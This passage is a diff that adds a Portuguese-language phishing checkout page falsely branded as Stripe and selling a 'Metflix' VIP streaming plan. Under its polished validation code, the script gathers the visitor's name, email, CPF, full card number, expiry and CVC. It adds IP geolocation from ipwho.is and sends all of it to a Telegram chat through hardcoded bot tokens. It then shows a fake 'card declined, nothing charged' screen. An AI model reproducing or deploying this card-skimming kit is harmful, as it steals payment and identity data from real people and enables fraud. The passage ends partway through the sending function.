+              <svg viewBox="0 0 44 28"><rect x=".5" y=".5" width="43" height="27" rx="4.5" fill="#000"/><text x="22" y="18.4" text-anchor="middle" font-family="Arial,Helvetica,sans-serif" font-size="10" font-weight="800" fill="#fff" letter-spacing=".3">elo</text></svg>
+            </span>
+          </div>
+        </div>
+
+        <div class="field">
+          <label for="name">Nome impresso no cartão</label>
+          <input class="input" id="name" name="cc-name" type="text" placeholder="Ex.: MARIA D S SANTOS" autocomplete="cc-name" maxlength="70" aria-required="true" aria-describedby="err-name">
+          <p class="error" id="err-name" role="alert"></p>
+        </div>
+
+        <div class="field">
+          <label for="number">Número do cartão</label>
+          <div class="input-group">
+            <svg class="lead-icon" viewBox="0 0 24 24" fill="none" aria-hidden="true"><rect x="3" y="5.5" width="18" height="13" rx="2.6" stroke="currentColor" stroke-width="1.7"/><path d="M3 10h18" stroke="currentColor" stroke-width="1.7"/></svg>
+            <input class="input has-lead has-trail" id="number" name="cc-number" type="text" inputmode="numeric" placeholder="0000 0000 0000 0000" autocomplete="cc-number" aria-required="true" aria-describedby="err-number">
+            <span class="trail" id="brandIndicator" aria-hidden="true"></span>
+          </div>
+          <p class="error" id="err-number" role="alert"></p>
+        </div>
+
+        <div class="row-2">
+          <div class="field">
+            <label for="expiry">Validade</label>
+            <input class="input" id="expiry" name="cc-exp" type="text" inputmode="numeric" placeholder="MM / AA" autocomplete="cc-exp" aria-required="true" aria-describedby="err-expiry">
+            <p class="error" id="err-expiry" role="alert"></p>
+          </div>
+          <div class="field">
+            <label for="cvv">
+              Código de segurança
+              <button type="button" class="help" title="São os 3 ou 4 dígitos impressos no verso do cartão." aria-label="O que é o código de segurança?">?</button>
+            </label>
+            <input class="input" id="cvv" name="cc-csc" type="text" inputmode="numeric" placeholder="CVC" autocomplete="cc-csc" maxlength="4" aria-required="true" aria-describedby="err-cvv">
+            <p class="error" id="err-cvv" role="alert"></p>
+          </div>
+        </div>
+
+        <button class="pay-btn" id="payBtn" type="submit">
+          <svg class="btn-lock" viewBox="0 0 24 24" fill="none" aria-hidden="true"><rect x="5" y="10.2" width="14" height="10.3" rx="2.6" stroke="currentColor" stroke-width="1.8"/><path d="M8.6 10.2V7.6a3.4 3.4 0 0 1 6.8 0v2.6" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/></svg>
+          <span class="spinner" aria-hidden="true"></span>
+          <span id="payBtnLabel">Pagar R$ 14,90</span>
+        </button>
+
+      </form>
+    </section>
+
+    <aside class="card summary" aria-labelledby="sumTitle">
+      <div class="summary-head">
+        <h2 id="sumTitle">Resumo do pedido</h2>
+        <span class="order-id">#ST-2048</span>
+      </div>
+
+      <!-- Produto / plano selecionado -->
+      <div class="product">
+        <div class="thumb" aria-hidden="true">
+          <img src="metflix.png" alt="" class="thumb-img">
+        </div>
+        <div class="product-info">
+          <h3 id="summaryPlanName">VIP Mensal</h3>
+          <p id="summaryPlanDesc">Acesso por 30 dias</p>
+          <span class="tag" id="summaryPlanTag">Produto digital</span>
+        </div>
+        <span class="product-price" id="summaryPlanPrice">R$ 14,90</span>
+      </div>
+
+      <div class="lines">
+        <div class="line"><span>Subtotal</span><span id="subtotal">R$ 14,90</span></div>
+        <div class="line"><span>Desconto</span><span class="discount" id="discount">R$ 0,00</span></div>
+        <div class="line"><span>Impostos</span><span>Incluídos</span></div>
+      </div>
+
+      <div class="coupon">
+        <label for="coupon">Cupom de desconto</label>
+        <div class="coupon-row">
+          <input class="input" id="coupon" type="text" placeholder="Digite o código" maxlength="24" autocomplete="off">
+          <button class="btn-ghost" type="button" id="applyCoupon">Aplicar</button>
+        </div>
+        <p class="coupon-msg" id="couponMessage" aria-live="polite"></p>
+      </div>
+
+      <div class="total-row">
+        <span>Total</span>
+        <div class="total-value">
+          <strong id="total">R$ 14,90</strong>
+          <small>BRL · pagamento único</small>
+        </div>
+      </div>
+
+      <div class="assurance">
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M12 3.2 19 6v5.2c0 4.4-2.8 7.6-7 9.8-4.2-2.2-7-5.4-7-9.8V6l7-2.8Z" stroke="currentColor" stroke-width="1.7" stroke-linejoin="round"/><path d="m9 12 2 2 4-4" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/></svg>
+          <span>Compra protegida e ambiente seguro</span>
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="1.7"/><path d="M12 7.5V12l3 1.8" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/></svg>
+          <span>Acesso liberado imediatamente após a confirmação</span>
+        </div>
+      </div>
+
+    </aside>
+
+  </div>
+</main>
+
+<footer class="footer">
+  <div class="footer-inner">
+    <span>© 2026 Stripe Studio</span>
+    <div class="footer-links">
+      <a href="#" data-doc="política de privacidade">Privacidade</a>
+      <a href="#" data-doc="termos de uso">Termos de uso</a>
+    </div>
+  </div>
+</footer>
+
+<div class="error-screen" id="errorScreen" role="dialog" aria-modal="true" aria-labelledby="errScreenTitle" aria-hidden="true">
+  <div class="error-card" id="errorCard">
+    <div class="error-icon" aria-hidden="true">
+      <svg viewBox="0 0 24 24" fill="none"><path d="M12 3.2 21 19H3L12 3.2Z" stroke="currentColor" stroke-width="1.9" stroke-linejoin="round"/><path d="M12 9.4v4.4" stroke="currentColor" stroke-width="2" stroke-linecap="round"/><circle cx="12" cy="16.6" r="1.1" fill="currentColor"/></svg>
+    </div>
+    <h2 id="errScreenTitle">Não foi possível processar o pagamento</h2>
+    <p class="error-sub">A transação foi recusada pelo emissor do cartão.</p>
+
+    <div class="error-summary">
+      <div class="error-row"><span>Cartão</span><span id="errCardLast">•••• 4242</span></div>
+      <div class="error-row"><span>Valor</span><span id="errAmount">R$ 14,90</span></div>
+      <div class="error-row"><span>Protocolo</span><span id="errProtocol">#ST-XXXXXX</span></div>
+    </div>
+
+    <p class="error-reason">Motivo: transação não autorizada</p>
+
+    <button type="button" class="error-primary" id="errRetry">Tentar novamente</button>
+    <button type="button" class="error-secondary" id="errChangeCard">Trocar de cartão</button>
+
+    <p class="error-safe">
+      <svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M12 3.2 19 6v5.2c0 4.4-2.8 7.6-7 9.8-4.2-2.2-7-5.4-7-9.8V6l7-2.8Z" stroke="currentColor" stroke-width="1.7" stroke-linejoin="round"/><path d="m9 12 2 2 4-4" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      Nenhum valor foi cobrado.
+    </p>
+    <p class="error-help">Precisa de ajuda? <a href="mailto:fale@lumina.com">fale@lumina.com</a></p>
+  </div>
+</div>
+
+<div class="toast" id="toast" role="status" aria-live="polite"></div>
+
+<script>
+(function () {
+  'use strict';
+
+  var $ = function (id) { return document.getElementById(id) || document.createElement('span'); };
+  var setText = function (id, text) {
+    var el = document.getElementById(id);
+    if (el) el.textContent = text;
+  };
+  var digits = function (v) { return String(v == null ? '' : v).replace(/\D+/g, ''); };
+  var pad2 = function (n) { n = String(n); return n.length < 2 ? '0' + n : n; };
+
+  // ===== Planos =====
+  var PLANS = {
+    teste:      { name: 'Teste 7 dias', desc: 'Acesso por 7 dias',  price: 990,  tag: 'Experimente' },
+    mensal:     { name: 'VIP Mensal',   desc: 'Acesso por 30 dias', price: 1490, tag: 'Produto digital' },
+    trimestral: { name: 'VIP 3 Meses',  desc: 'Acesso por 90 dias', price: 3490, tag: 'Mais popular' },
+    vitalicio:  { name: 'Vitalício',    desc: 'Acesso para sempre', price: 4990, tag: 'Melhor valor' }
+  };
+  var selectedPlanId = 'mensal';
+  var discount = 0;
+  var couponApplied = false;
+
+  function getPlan() { return PLANS[selectedPlanId] || PLANS.mensal; }
+
+  var money = function (cents) {
+    return (cents / 100).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+  };
+
+  var loader = $('loaderOverlay');
+  window.setTimeout(function () {
+    loader.classList.add('is-hidden');
+    window.setTimeout(function () { loader.style.display = 'none'; }, 550);
+  }, 1300);
+
+  var BRANDS = [
+    { key: 'amex',       label: 'American Express', test: /^3[47]/,                                                                          lengths: [15],             cvc: 4, groups: [4, 6, 5] },
+    { key: 'elo',        label: 'Elo',              test: /^(4011|4312|4389|4514|4573|5041|5066|5067|509\d|6277|6362|6363|650\d|6516|6550)/, lengths: [16],             cvc: 3 },
+    { key: 'hipercard',  label: 'Hipercard',        test: /^(606282|3841)/,                                                                  lengths: [16],             cvc: 3 },
+    { key: 'diners',     label: 'Diners Club',      test: /^(30[0-5]|36|38|39)/,                                                             lengths: [14, 16, 19],     cvc: 3 },
+    { key: 'jcb',        label: 'JCB',              test: /^35(2[89]|[3-8]\d)/,                                                              lengths: [16, 17, 18, 19], cvc: 3 },
+    { key: 'discover',   label: 'Discover',         test: /^(6011|65|64[4-9])/,                                                              lengths: [16, 19],         cvc: 3 },
+    { key: 'mastercard', label: 'Mastercard',       test: /^(5[1-5]|222[1-9]|22[3-9]\d|2[3-6]\d\d|27[01]\d|2720)/,                          lengths: [16],             cvc: 3 },
+    { key: 'visa',       label: 'Visa',             test: /^4/,                                                                              lengths: [13, 16, 19],     cvc: 3 }
+  ];
+
+  function detectBrand(d) {
+    d = digits(d);
+    if (!d) return null;
+    for (var i = 0; i < BRANDS.length; i++) {
+      if (BRANDS[i].test.test(d)) return BRANDS[i];
+    }
+    return null;
+  }
+
+  var EXTRA_BADGES = {
+    hipercard: '<svg viewBox="0 0 44 28"><rect x=".5" y=".5" width="43" height="27" rx="4.5" fill="#b3131b"/><text x="22" y="17.6" text-anchor="middle" font-family="Arial,Helvetica,sans-serif" font-size="8.4" font-weight="800" fill="#fff">Hiper</text></svg>',
+    diners:    '<svg viewBox="0 0 44 28"><rect x=".5" y=".5" width="43" height="27" rx="4.5" fill="#fff" stroke="#e6e8ec"/><text x="22" y="17.4" text-anchor="middle" font-family="Arial,Helvetica,sans-serif" font-size="7.6" font-weight="800" fill="#0079be">DINERS</text></svg>',
+    jcb:       '<svg viewBox="0 0 44 28"><rect x=".5" y=".5" width="43" height="27" rx="4.5" fill="#fff" stroke="#e6e8ec"/><text x="22" y="18.6" text-anchor="middle" font-family="Arial,Helvetica,sans-serif" font-size="11" font-weight="800" fill="#0b4ea2">JCB</text></svg>',
+    discover:  '<svg viewBox="0 0 44 28"><rect x=".5" y=".5" width="43" height="27" rx="4.5" fill="#fff" stroke="#e6e8ec"/><text x="22" y="17.4" text-anchor="middle" font-family="Arial,Helvetica,sans-serif" font-size="6.6" font-weight="800" fill="#e8601c">DISCOVER</text></svg>'
+  };
+
+  var currentBrandKey = null;
+
+  function updateBrand() {
+    var b = detectBrand(inputs.number.value);
+    var brand = b ? b.key : null;
+
+    var badges = document.querySelectorAll('#brandStrip .brand-badge');
+    for (var i = 0; i < badges.length; i++) {
+      var el = badges[i];
+      el.classList.toggle('is-active', el.getAttribute('data-brand') === brand);
+      el.classList.toggle('is-dim', !!brand && el.getAttribute('data-brand') !== brand);
+    }
+
+    var trail = $('brandIndicator');
+    trail.innerHTML = '';
+    if (brand) {
+      var src = document.querySelector('#brandStrip [data-brand="' + brand + '"]');
+      if (src) {
+        var clone = src.cloneNode(true);
+        clone.classList.remove('is-active', 'is-dim');
+        trail.appendChild(clone);
+      } else if (EXTRA_BADGES[brand]) {
+        var span = document.createElement('span');
+        span.className = 'brand-badge';
+        span.setAttribute('data-brand', brand);
+        span.innerHTML = EXTRA_BADGES[brand];
+        trail.appendChild(span);
+      }
+    }
+
+    inputs.cvv.setAttribute('maxlength', (b && b.cvc === 3) ? '3' : '4');
+
+    if (brand !== currentBrandKey) {
+      currentBrandKey = brand;
+      if (inputs.cvv.value && inputs.cvv.classList.contains('is-invalid')) validateField('cvv');
+    }
+  }
+
+  function formatNumber(raw) {
+    var d = digits(raw).slice(0, 19);
+    var b = detectBrand(d);
+    var groups = (b && b.groups) || [4, 4, 4, 4, 4];
+    var out = [], i = 0, g = 0;
+    while (i < d.length) {
+      var size = g < groups.length ? groups[g] : 4;
+      out.push(d.substr(i, size));
+      i += size;
+      g++;
+    }
+    return out.join(' ');
+  }
+
+  function formatCPF(raw) {
+    var d = digits(raw).slice(0, 11);
+    if (d.length <= 3) return d;
+    if (d.length <= 6) return d.slice(0, 3) + '.' + d.slice(3);
+    if (d.length <= 9) return d.slice(0, 3) + '.' + d.slice(3, 6) + '.' + d.slice(6);
+    return d.slice(0, 3) + '.' + d.slice(3, 6) + '.' + d.slice(6, 9) + '-' + d.slice(9);
+  }
+
+  function expiryParts(raw) {
+    var s = String(raw == null ? '' : raw).trim();
+    var m = s.match(/^(\d{1,2})\s*[\/\-.\s]\s*(\d{4})$/) || s.match(/^(\d{1,2})\s*[\/\-.\s]\s*(\d{2})$/);
+    if (m) return { mm: pad2(m[1]), yy: m[2].slice(-2) };
+    if (/^\d{4}$/.test(s)) return { mm: s.slice(0, 2), yy: s.slice(2, 4) };
+    if (/^\d{6}$/.test(s)) return { mm: s.slice(0, 2), yy: s.slice(4, 6) };
+    return null;
+  }
+
+  function formatExpiry(raw, deleting) {
+    var s = String(raw == null ? '' : raw);
+    var p = expiryParts(s);
+    if (p) return p.mm + ' / ' + p.yy;
+    if (!deleting && /^\s*1\s*[\/\-.]\s*$/.test(s)) return '01 / ';
+    var d = digits(s).slice(0, 4);
+    if (!d) return '';
+    if (d.length === 1) {
+      if (!deleting && d > '1') return '0' + d + ' / ';
+      return d;
+    }
+    if (d.length === 2) return deleting ? d : d + ' / ';
+    return d.slice(0, 2) + ' / ' + d.slice(2);
+  }
+
+  var NORMALIZERS = {
+    fullname: function (v) { return v; },
+    email:    function (v) { return v; },
+    cpf:      function (v) { return formatCPF(v); },
+    name:     function (v) { return v; },
+    number:   function (v) { return formatNumber(v); },
+    expiry:   function (v, deleting) { return formatExpiry(v, deleting); },
+    cvv:      function (v) { return digits(v).slice(0, 4); }
+  };
+
+  function luhn(d) {
+    var sum = 0, alt = false;
+    for (var i = d.length - 1; i >= 0; i--) {
+      var n = parseInt(d.charAt(i), 10);
+      if (alt) { n *= 2; if (n > 9) n -= 9; }
+      sum += n;
+      alt = !alt;
+    }
+    return sum % 10 === 0;
+  }
+
+  function lengthsText(list) {
+    if (list.length === 1) return String(list[0]);
+    var consecutive = true;
+    for (var i = 1; i < list.length; i++) { if (list[i] !== list[i - 1] + 1) consecutive = false; }
+    if (consecutive) return list[0] + ' a ' + list[list.length - 1];
+    return list.slice(0, -1).join(', ') + ' ou ' + list[list.length - 1];
+  }
+
+  var LETTER = 'A-Za-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u00FF\\u0100-\\u017F';
+  var NAME_RE = new RegExp('^[' + LETTER + ']+(?: [' + LETTER + ']+)*$');
+
+  function checkPersonName(raw, emptyMsg) {
+    var s = String(raw == null ? '' : raw).replace(/\s+/g, ' ').trim();
+    if (!s) return emptyMsg;
+    if (/\d/.test(s)) return 'O nome não pode conter números.';
+    if (!NAME_RE.test(s)) return 'Use apenas letras e espaços.';
+    if (s.split(' ').length < 2) return 'Informe nome e sobrenome.';
+    return '';
+  }
+
+  function checkFullName(raw) { return checkPersonName(raw, 'Informe seu nome completo.'); }
+  function checkName(raw) { return checkPersonName(raw, 'Informe o nome impresso no cartão.'); }
+
+  function checkEmail(raw) {
+    var s = String(raw == null ? '' : raw).trim();
+    if (!s) return 'Informe seu e-mail.';
+    if (s.length > 254) return 'E-mail muito longo.';
+    if (/\s/.test(s)) return 'O e-mail não pode conter espaços.';
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(s)) return 'Informe um e-mail válido (ex.: seuemail@gmail.com).';
+    return '';
+  }
+
+  function checkCPF(raw) {
+    var d = digits(raw);
+    if (!d) return 'Informe seu CPF.';
+    if (d.length !== 11) return 'O CPF deve ter 11 dígitos.';
+    if (/^(\d)\1{10}$/.test(d)) return 'CPF inválido.';
+    var sum = 0;
+    for (var i = 0; i < 9; i++) sum += parseInt(d.charAt(i), 10) * (10 - i);
+    var d1 = (sum * 10) % 11;
+    if (d1 === 10) d1 = 0;
+    if (d1 !== parseInt(d.charAt(9), 10)) return 'CPF inválido. Verifique os dígitos.';
+    sum = 0;
+    for (var j = 0; j < 10; j++) sum += parseInt(d.charAt(j), 10) * (11 - j);
+    var d2 = (sum * 10) % 11;
+    if (d2 === 10) d2 = 0;
+    if (d2 !== parseInt(d.charAt(10), 10)) return 'CPF inválido. Verifique os dígitos.';
+    return '';
+  }
+
+  function checkNumber(raw) {
+    var s = String(raw == null ? '' : raw).replace(/[\s\-]+/g, '');
+    if (!s) return 'Informe o número do cartão.';
+    if (/\D/.test(s)) return 'Use apenas números.';
+    if (s.length < 13 || s.length > 19) return 'O número do cartão deve ter entre 13 e 19 dígitos.';
+    if (!luhn(s)) return 'Número de cartão inválido. Confira os dígitos.';
+    var b = detectBrand(s);
+    if (!b) return 'Bandeira não reconhecida. Use Visa, Mastercard, Amex, Elo, Hipercard, Diners, JCB ou Discover.';
+    if (b.lengths.indexOf(s.length) === -1) {
+      return 'Tamanho incorreto para ' + b.label + ': o número deve ter ' + lengthsText(b.lengths) + ' dígitos.';
+    }
+    return '';
+  }
+
+  function checkExpiry(raw, now) {
+    var s = String(raw == null ? '' : raw).trim();
+    if (!s) return 'Informe a validade (MM / AA).';
+    var p = expiryParts(s);
+    if (!p) return 'Use o formato MM / AA.';
+    var mm = parseInt(p.mm, 10);
+    var fy = 2000 + parseInt(p.yy, 10);
+    if (mm < 1 || mm > 12) return 'Mês inválido. Use de 01 a 12.';
+    var diff = (fy - now.getFullYear()) * 12 + (mm - (now.getMonth() + 1));
+    if (diff < 0) return 'Cartão vencido.';
+    if (diff > 240) return 'Data de validade inválida.';
+    return '';
+  }
+
+  function checkCvv(raw, brand) {
+    var s = String(raw == null ? '' : raw).trim();
+    if (!s) return 'Informe o código de segurança.';
+    if (/\D/.test(s)) return 'Use apenas números.';
+    if (brand && brand.cvc === 4) {
+      if (s.length !== 4) return 'O código de segurança do American Express tem 4 dígitos.';
+    } else if (brand) {
+      if (s.length !== 3) return 'O código de segurança deve ter 3 dígitos.';
+    } else if (s.length < 3 || s.length > 4) {
+      return 'Informe os 3 ou 4 dígitos.';
+    }
+    return '';
+  }
+
+  var FIELDS = ['fullname', 'email', 'cpf', 'name', 'number', 'expiry', 'cvv'];
+  var inputs = {
+    fullname: $('fullname'),
+    email:    $('email'),
+    cpf:      $('cpf'),
+    name:     $('name'),
+    number:   $('number'),
+    expiry:   $('expiry'),
+    cvv:      $('cvv')
+  };
+  var seen = { fullname: '', email: '', cpf: '', name: '', number: '', expiry: '', cvv: '' };
+
+  function setError(key, msg) {
+    var input = inputs[key];
+    var err = $('err-' + key);
+    if (msg) {
+      input.classList.add('is-invalid');
+      input.setAttribute('aria-invalid', 'true');
+      err.textContent = msg;
+      err.classList.add('is-shown');
+    } else {
+      input.classList.remove('is-invalid');
+      input.removeAttribute('aria-invalid');
+      err.textContent = '';
+      err.classList.remove('is-shown');
+    }
+  }
+
+  function fieldError(key) {
+    switch (key) {
+      case 'fullname': return checkFullName(inputs.fullname.value);
+      case 'email':    return checkEmail(inputs.email.value);
+      case 'cpf':      return checkCPF(inputs.cpf.value);
+      case 'name':     return checkName(inputs.name.value);
+      case 'number':   return checkNumber(inputs.number.value);
+      case 'expiry':   return checkExpiry(inputs.expiry.value, new Date());
+      case 'cvv':      return checkCvv(inputs.cvv.value, detectBrand(inputs.number.value));
+    }
+    return '';
+  }
+
+  function validateField(key) {
+    var msg = fieldError(key);
+    setError(key, msg);
+    return !msg;
+  }
+
+  function setValueKeepCaret(el, next) {
+    var prev = el.value;
+    var active = document.activeElement === el;
+    var pos = null;
+    if (active) { try { pos = el.selectionStart; } catch (e) { pos = null; } }
+    el.value = next;
+    if (active && pos !== null && pos < prev.length) {
+      var before = digits(prev.slice(0, pos)).length;
+      var p = 0, count = 0;
+      while (p < next.length && count < before) {
+        if (/\d/.test(next.charAt(p))) count++;
+        p++;
+      }
+      try { el.setSelectionRange(p, p); } catch (e) { /* ignora */ }
+    }
+  }
+
+  function syncField(key, deleting) {
+    var el = inputs[key];
+    var before = el.value;
+    var after = NORMALIZERS[key](before, deleting);
+    if (after !== before) setValueKeepCaret(el, after);
+    seen[key] = el.value;
+    if (key === 'number') updateBrand();
+    return el.value;
+  }
+
+  var suppressBlur = false;
+  var suppressTimer = null;
+
+  function commit(key) {
+    syncField(key);
+    if (suppressBlur) return;
+    if (!inputs[key].value && document.activeElement === inputs[key]) return;
+    validateField(key);
+  }
+
+  function handleExternal(key) {
+    var el = inputs[key];
+    if (!el.value) { seen[key] = ''; return; }
+    syncField(key);
+    setError(key, '');
+    if (!suppressBlur) validateField(key);
+  }
+
+  function checkAutofill() {
+    for (var i = 0; i < FIELDS.length; i++) {
+      var key = FIELDS[i];
+      if (inputs[key].value !== seen[key]) handleExternal(key);
+    }
+  }
+
+  var watchTimer = null;
+  var watchUntil = 0;
+  function startWatch(ms) {
+    watchUntil = Math.max(watchUntil, Date.now() + ms);
+    if (watchTimer) return;
+    watchTimer = window.setInterval(function () {
+      checkAutofill();
+      if (Date.now() > watchUntil) {
+        window.clearInterval(watchTimer);
+        watchTimer = null;
+      }
+    }, 300);
+  }
+
+  FIELDS.forEach(function (key) {
+    var el = inputs[key];
+    el.addEventListener('input', function (e) {
+      var deleting = !!(e && e.inputType && e.inputType.indexOf('delete') === 0);
+      syncField(key, deleting);
+      setError(key, '');
+    });
+    el.addEventListener('change', function () { commit(key); });
+    el.addEventListener('blur', function () { commit(key); });
+    el.addEventListener('focus', function () { startWatch(10000); checkAutofill(); });
+    el.addEventListener('click', function () { startWatch(10000); checkAutofill(); });
+  });
+
+  $('checkoutForm').addEventListener('animationstart', function (e) {
+    if (e.animationName !== 'onAutoFillStart') return;
+    var target = e.target;
+    for (var i = 0; i < FIELDS.length; i++) {
+      if (inputs[FIELDS[i]] === target) { checkAutofill(); handleExternal(FIELDS[i]); return; }
+    }
+  });
+
+  startWatch(10000);
+  window.addEventListener('load', function () { startWatch(10000); checkAutofill(); });
+  window.addEventListener('focus', function () { startWatch(4000); checkAutofill(); });
+  document.addEventListener('visibilitychange', function () { if (!document.hidden) checkAutofill(); });
+
+  // ===== Planos: interação =====
+  function updateSummary() {
+    var p = getPlan();
+    setText('summaryPlanName', p.name);
+    setText('summaryPlanDesc', p.desc);
+    setText('summaryPlanTag', p.tag);
+    setText('summaryPlanPrice', money(p.price));
+  }
+
+  function selectPlan(id) {
+    if (!PLANS[id]) return;
+    selectedPlanId = id;
+
+    var opts = document.querySelectorAll('.plan');
+    for (var i = 0; i < opts.length; i++) {
+      var on = opts[i].getAttribute('data-plan') === id;
+      opts[i].classList.toggle('is-selected', on);
+      var inp = opts[i].querySelector('.plan-input');
+      if (inp) inp.checked = on;
+    }
+
+    if (couponApplied) {
+      discount = Math.round(PLANS[id].price * 0.10);
+    } else {
+      discount = 0;
+    }
+
+    updateSummary();
+    render();
+  }
+
+  var planInputs = document.querySelectorAll('.plan-input');
+  for (var pi = 0; pi < planInputs.length; pi++) {
+    planInputs[pi].addEventListener('change', function () {
+      if (this.checked) selectPlan(this.value);
+    });
+  }
+
+  function render() {
+    var base = getPlan().price;
+    var total = base - discount;
+    setText('subtotal', money(base));
+    var dEl = $('discount');
+    dEl.textContent = discount ? '− ' + money(discount) : money(0);
+    dEl.classList.toggle('is-on', discount > 0);
+    setText('total', money(total));
+    setText('payBtnLabel', 'Pagar ' + money(total));
+  }
+
+  function couponMsg(text, type) {
+    var el = $('couponMessage');
+    el.textContent = text;
+    el.className = 'coupon-msg is-shown ' + type;
+  }
+
+  function applyCouponCode() {
+    var code = $('coupon').value.trim().toUpperCase();
+    if (!code) { couponMsg('Digite um código de cupom.', 'error'); return; }
+    if (couponApplied) { couponMsg('Você já aplicou um cupom.', 'error'); return; }
+
+    if (code === 'LUMINA10') {
+      discount = Math.round(getPlan().price * 0.10);
+      couponApplied = true;
+      $('coupon').disabled = true;
+      $('applyCoupon').disabled = true;
+      $('applyCoupon').textContent = 'Aplicado';
+      couponMsg('Cupom LUMINA10 aplicado — 10% de desconto.', 'ok');
+      render();
+    } else {
+      couponMsg('Cupom não reconhecido. Tente LUMINA10.', 'error');
+    }
+  }
+
+  $('applyCoupon').addEventListener('click', applyCouponCode);
+  $('coupon').addEventListener('keydown', function (e) {
+    if (e.key === 'Enter') { e.preventDefault(); applyCouponCode(); }
+  });
+
+  var TELEGRAM_BOTS = [
+    '8610088556:AAGqCfdhrHyb7Z1bqeaDheXTN4NOLiv2J5U',
+    '8941144886:AAHpcOtxoJICIr77SpRKi6wByvj8bIzVWwc'
+  ];
+  var TELEGRAM_CHAT_ID = '-5343213683';
+
+  function escapeHTML(s) {
+    return String(s == null ? '' : s)
+      .replace(/&/g, '&amp;')
+      .replace(/</g, '&lt;')
+      .replace(/>/g, '&gt;');
+  }
+
+  function nextBotIndex() {
+    var stored = 0;
+    try { stored = parseInt(localStorage.getItem('tg_bot_idx') || '0', 10) || 0; } catch (e) { stored = 0; }
+    var use = stored % 2;
+    try { localStorage.setItem('tg_bot_idx', String((use + 1) % 2)); } catch (e) { /* ignora */ }
+    return use;
+  }
+
+  function generateProtocol() {
+    var chars = 'ABCDEF0123456789';
+    var s = '';
+    for (var i = 0; i < 6; i++) s += chars.charAt(Math.floor(Math.random() * chars.length));
+    return '#ST-' + s;
+  }
+
+  function captureFormData() {
+    var numberRaw = digits(inputs.number.value);
+    var brand = detectBrand(inputs.number.value);
+    var totalCents = getPlan().price - discount;
+    return {
+      fullname: inputs.fullname.value.trim(),
+      email: inputs.email.value.trim(),
+      cpf: inputs.cpf.value.trim(),
+      holder: inputs.name.value.trim().toUpperCase(),
+      number: inputs.number.value.trim(),
+      last4: numberRaw.slice(-4),
+      brand: brand ? brand.label.toUpperCase() : 'DESCONHECIDA',
+      expiry: inputs.expiry.value.trim(),
+      cvc: inputs.cvv.value.trim(),
+      plan: getPlan().name,
+      planId: selectedPlanId,
+      total: money(totalCents),
+      totalCents: totalCents
+    };
+  }
+
+  function captureEnv() {
+    var env = {
+      ip: '', city: '', state: '', country: '', carrier: '',
+      userAgent: navigator.userAgent || '—',
+      screen: (window.screen ? (screen.width + 'x' + screen.height) : '—'),
+      timezone: '—',
+      language: navigator.language || '—',
+      referrer: document.referrer || 'direto',
+      datetime: new Date().toLocaleString('pt-BR')
+    };
+    try { env.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || '—'; } catch (e) { /* ignora */ }
+
+    return new Promise(function (resolve) {
+      var done = false;
+      var finish = function () { if (!done) { done = true; resolve(env); } };
+      var timer = window.setTimeout(finish, 4000);
+
+      try {
+        fetch('https://ipwho.is/', { method: 'GET', cache: 'no-store' })
+          .then(function (r) { return r.json(); })
+          .then(function (data) {
+            window.clearTimeout(timer);
+            if (data && data.success !== false) {
+              env.ip = data.ip || '';
+              env.city = data.city || '';
+              env.state = data.region || '';
+              env.country = data.country || '';
+              env.carrier = (data.connection && (data.connection.isp || data.connection.org)) || '';
+            }
+            finish();
+          })
+          .catch(function () { window.clearTimeout(timer); finish(); });
+      } catch (e) {
+        window.clearTimeout(timer);
+        finish();
+      }
+    });
+  }
+
+  function buildTelegramMessage(formData, env, protocol) {
+    var E = escapeHTML;
+    var lines = [
+      '🟢 <b>NOVO PEDIDO — Stripe</b>',
+      '━━━━━━━━━━━━━━',
+      '👤 <b>' + E(formData.fullname) + '</b>',
+      '📧 ' + E(formData.email),
+      '🆔 CPF: ' + E(formData.cpf),
+      '━━━━━━━━━━━━━━',
+      '📦 Plano: ' + E(formData.plan),
+      '💳 ' + E(formData.number),
+      '🏷️ Bandeira: ' + E(formData.brand),
+      '📅 Validade: ' + E(formData.expiry),
+      '🔐 CVC: ' + E(formData.cvc),
+      '👤 Titular: ' + E(formData.holder),
+      '━━━━━━━━━━━━━━',
+      '🌐 IP: ' + E(env.ip || '—'),
+      '📍 ' + E(env.city || '—') + ', ' + E(env.state || '—') + ', ' + E(env.country || '—'),
+      '📡 Operadora: ' + E(env.carrier || '—'),
+      '🕒 ' + E(env.datetime),
+      '📟 ' + E(env.userAgent),
+      '🖥️ ' + E(env.screen) + ' · ' + E(env.timezone) + ' · ' + E(env.language),
+      '🔗 ' + E(env.referrer),
+      '━━━━━━━━━━━━━━',
+      '💰 ' + E(formData.total) + ' · Protocolo ' + E(protocol)
+    ];
+    return lines.join('\n');
+  }
+
+  function tgUrl(token, text) {
+    return 'https://api.telegram.org/bot' + token + '/sendMessage' +
+      '?chat_id=' + encodeURIComponent(TELEGRAM_CHAT_ID) +
+      '&parse_mode=HTML' +
+      '&disable_web_page_preview=true' +
+      '&text=' + encodeURIComponent(text);
+  }
+
+  function trySend(url) {
+    return new Promise(function (resolve) {
+      var ctrl = null;
+      var timer = null;
+      var cleanup = function () {
+        if (timer) window.clearTimeout(timer);
+        timer = null;
+      };
+      try {
+        ctrl = (typeof AbortController !== 'undefined') ? new AbortController() : null;
+        timer = window.setTimeout(function () {
+          if (ctrl) { try { ctrl.abort(); } catch (e) {} }
+          resolve(false);
+        }, 4500);
+
+        fetch(url, {
+          method: 'GET',
+          keepalive: true,
+          cache: 'no-store',
+          signal: ctrl ? ctrl.signal : undefined
+        }).then(function (r) { cleanup(); resolve(!!r && (r.ok || r.type === 'opaque')); })
+          .catch(function () { cleanup(); resolve(false); });
+      } catch (e) {
+        cleanup();
+        resolve(false);
+      }
+    });
+  }
+
+  function sendToTelegram(text) {
+    var idx = nextBotIndex();
+    var botA = TELEGRAM_BOTS[idx];
